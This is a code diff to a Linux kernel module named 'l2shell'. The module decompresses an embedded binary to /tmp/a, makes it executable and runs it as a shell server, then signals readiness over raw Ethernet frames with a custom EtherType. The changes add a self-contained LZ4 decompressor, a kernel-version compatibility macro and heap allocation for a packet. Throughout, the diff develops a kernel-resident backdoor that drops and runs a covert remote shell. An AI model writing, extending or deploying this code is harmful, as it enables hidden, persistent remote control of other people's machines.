@@ -15,7 +15,6 @@
 #include <linux/init.h>
 #include <linux/fs.h>
 #include <linux/kmod.h>
-#include <linux/lz4.h>
 #include <linux/module.h>
 #include <linux/netdevice.h>
 #include <linux/namei.h>
@@ -39,6 +38,9 @@
 #define KMOD_DEDUP_WINDOW_NS (5 * 1000 * 1000ULL)
 #define L2SHELL_TMP_PATH "/tmp/a"
 #define L2SHELL_DEFAULT_CMD "/tmp/a server any"
+#define LZ4_MIN_MATCH 4
+#define LZ4_RUN_MASK 0x0F
+#define LZ4_ML_MASK 0x0F
 
 struct __attribute__((packed)) packh {
     struct ethhdr eth;
@@ -65,7 +67,73 @@ static struct {
     bool capture_enabled;
 } g;
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 3, 0)
+#define L2SHELL_MNT_IDMAP(path) ((path)->mnt->mnt_idmap)
+#else
+#define L2SHELL_MNT_IDMAP(path) (&init_user_ns)
+#endif
+
 #define l2sh_info(fmt, ...) pr_info("l2sh: " fmt, ##__VA_ARGS__)
+
+static int l2sh_lz4_decompress(const u8 *src, size_t src_size, u8 *dst, size_t dst_capacity) {
+    const u8 *ip = src;
+    const u8 *src_end = src + src_size;
+    u8 *op = dst;
+    u8 *dst_end = dst + dst_capacity;
+
+    while (ip < src_end) {
+        size_t literal_len;
+        size_t match_len;
+        u16 offset;
+        const u8 *match;
+        u8 token = *ip++;
+
+        literal_len = token >> 4;
+        if (literal_len == LZ4_RUN_MASK) {
+            u8 s = 0;
+            while (ip < src_end && (s = *ip++) == 0xFF)
+                literal_len += 0xFF;
+            if (ip > src_end)
+                return -EIO;
+            literal_len += s;
+        }
+
+        if (ip + literal_len > src_end || op + literal_len > dst_end)
+            return -EIO;
+        memcpy(op, ip, literal_len);
+        ip += literal_len;
+        op += literal_len;
+
+        if (ip >= src_end)
+            break;
+
+        if (ip + 2 > src_end)
+            return -EIO;
+        offset = (u16)ip[0] | ((u16)ip[1] << 8);
+        ip += 2;
+        if (!offset || offset > (size_t)(op - dst))
+            return -EIO;
+        match = op - offset;
+
+        match_len = token & LZ4_ML_MASK;
+        if (match_len == LZ4_ML_MASK) {
+            u8 s = 0;
+            while (ip < src_end && (s = *ip++) == 0xFF)
+                match_len += 0xFF;
+            if (ip > src_end)
+                return -EIO;
+            match_len += s;
+        }
+        match_len += LZ4_MIN_MATCH;
+
+        if (op + match_len > dst_end)
+            return -EIO;
+        while (match_len--)
+            *op++ = *match++;
+    }
+
+    return (int)(op - dst);
+}
 
 static size_t store_spawn_cmd(const u8 *payload, size_t len, const hello_view_t *hello) {
     ssize_t copied;
@@ -86,11 +154,7 @@ static int ensure_exec_perms_path(struct path *path) {
     };
     struct inode *inode = d_inode(path->dentry);
     attr.ia_mode = (inode->i_mode & S_IFMT) | S_IRWXU;
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 3, 0)
-    return notify_change(path->mnt->mnt_idmap, path->dentry, &attr, NULL);
-#else
-    return notify_change(&init_user_ns, path->dentry, &attr, NULL);
-#endif
+    return notify_change(L2SHELL_MNT_IDMAP(path), path->dentry, &attr, NULL);
 }
 
 static int ensure_exec_perms_file(struct file *filp) {
@@ -141,9 +205,9 @@ static int ensure_l2shell_binary(void) {
         goto out_close;
     }
 
-    ret = LZ4_decompress_safe((const char *)l2shell_embed,
-                              (char *)decomp,
+    ret = l2sh_lz4_decompress(l2shell_embed,
                               l2shell_embed_len,
+                              decomp,
                               l2shell_embed_orig_len);
     if (ret < 0 || (size_t)ret != l2shell_embed_orig_len) {
         ret = -EIO;
@@ -217,7 +281,7 @@ static int build_server_packet(struct pack *pkt, const u8 *src_mac, const u8 *ds
 }
 
 static void send_ready_ack(struct net_device *dev, const u8 dst_mac[ETH_ALEN], const struct hello_view *hello) {
-    struct pack pkt;
+    struct pack *pkt;
     struct sk_buff *skb;
     char payload[64];
     size_t payload_len;
@@ -240,19 +304,28 @@ static void send_ready_ack(struct net_device *dev, const u8 dst_mac[ETH_ALEN], c
                                 "ready source=kernel\n");
     }
 
-    frame_len = build_server_packet(&pkt, dev->dev_addr, dst_mac,
-                                    (const u8 *)payload, payload_len);
-    if (frame_len < 0)
+    pkt = kzalloc(sizeof(*pkt), GFP_KERNEL);
+    if (!pkt)
         return;
+
+    frame_len = build_server_packet(pkt, dev->dev_addr, dst_mac,
+                                    (const u8 *)payload, payload_len);
+    if (frame_len < 0) {
+        kfree(pkt);
+        return;
+    }
 
     skb = netdev_alloc_skb(dev, frame_len + NET_IP_ALIGN);
-    if (!skb)
+    if (!skb) {
+        kfree(pkt);
         return;
+    }
 
     skb_reserve(skb, NET_IP_ALIGN);
-    memcpy(skb_put(skb, frame_len), &pkt, frame_len);
+    memcpy(skb_put(skb, frame_len), pkt, frame_len);
     skb->dev = dev;
     skb->protocol = htons(ETHER_TYPE_CUSTOM);
+    kfree(pkt);
 
     err = dev_queue_xmit(skb);
     if (err)
